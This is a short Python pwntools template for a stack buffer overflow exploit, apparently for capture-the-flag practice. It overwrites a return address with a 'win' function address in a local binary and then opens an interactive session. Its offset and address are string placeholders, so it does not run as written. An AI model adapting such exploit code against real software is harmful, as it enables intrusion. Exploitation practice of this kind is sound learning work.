from pwn import *

offset = "your offset"
win_addr = "your win addrr"

payload = b"A"*offset + p64(win_addr)

p = process("./binary name")

p.send(payload)
p.interactive()